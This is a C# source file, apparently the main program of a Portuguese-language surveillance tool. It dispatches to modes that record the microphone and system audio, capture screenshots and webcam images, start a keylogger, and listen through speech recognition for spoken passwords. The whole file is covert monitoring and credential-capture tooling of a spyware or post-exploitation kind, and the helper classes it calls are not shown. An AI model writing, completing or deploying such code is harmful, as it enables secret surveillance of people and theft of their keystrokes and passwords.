using System;
using System.Speech.Recognition;

namespace SKGBr
{
    class Program
    {
        static void Main(string[] args)
        {
            int recordTime = 10000;
            bool recordMic = false;
            bool recordSys = false;
            bool recordAudio = false;
            bool captureScreen = false;
            bool captureWebCam = false;
            bool captureKeyStrokes = false;
            bool listenPassword = false;

            if (args.Length == 0 || args.Length > 2)
            {
                Helpers.Usage();
                Environment.Exit(1);
            }
            switch (args[0])
            {
                case "gravar_mic":
                    recordMic = true;
                    break;
                case "gravar_sys":
                    recordSys = true;
                    break;
                case "captura_tela":
                    captureScreen = true;
                    break;
                case "gravar_audio":
                    recordAudio = true;
                    break;
                case "captura_webcam":
                    captureWebCam = true;
                    break;
                case "captura_teclas":
                    captureKeyStrokes = true;
                    break;
                case "escuta_senhas ":
                    listenPassword = true;
                    break;
                default:
                    Helpers.Usage();
                    Environment.Exit(1);
                    break;
            }

            // parsing here
            if (recordMic)
            {
                if (args.Length == 2)
                {
                    recordTime = Helpers.ParseTimerString(args[1]);
                }
                string tempFile = Helpers.CreateTempFileName(".wav");
                Audio.RecordMicrophone(tempFile, recordTime);
                Console.WriteLine("[+] Gravação de microfone localizada em: {0}", tempFile);
            }
            else if (recordSys)
            {
                if (args.Length == 2)
                {
                    recordTime = Helpers.ParseTimerString(args[1]);
                }
                string tempFile = Helpers.CreateTempFileName(".wav");
                Audio.RecordSystemAudio(tempFile, recordTime);
                Console.WriteLine("[+] Arquivo de gravação do alto-falante localizado em: {0}", tempFile);
            }
            else if (recordAudio)
            {
                if (args.Length == 2)
                {
                    recordTime = Helpers.ParseTimerString(args[1]);
                }
                Audio.RecordAudio(recordTime);
            }
            else if (captureWebCam)
            {
                string tempFile = Helpers.CreateTempFileName(".jpeg");
                WebCam.CaptureImage(tempFile);
            }
            else if (captureScreen)
            {
                string tempFile = Helpers.CreateTempFileName(".jpeg");
                Display.CaptureImage(tempFile);
                Console.WriteLine("[+] Captura de tela capturada em: {0}", tempFile);
            }
            else if (captureKeyStrokes)
            {
                Keyboard.StartKeylogger();
            }
            else if (listenPassword)
            {
                if (args.Length == 2)
                {
                    string[] words = args[1].Split(',');
                    Choices ch = new Choices(words);
                    Audio.ListenForPasswords(ch);
                }
                else
                {
                    Audio.ListenForPasswords();
                }
            }
        }
    }
}
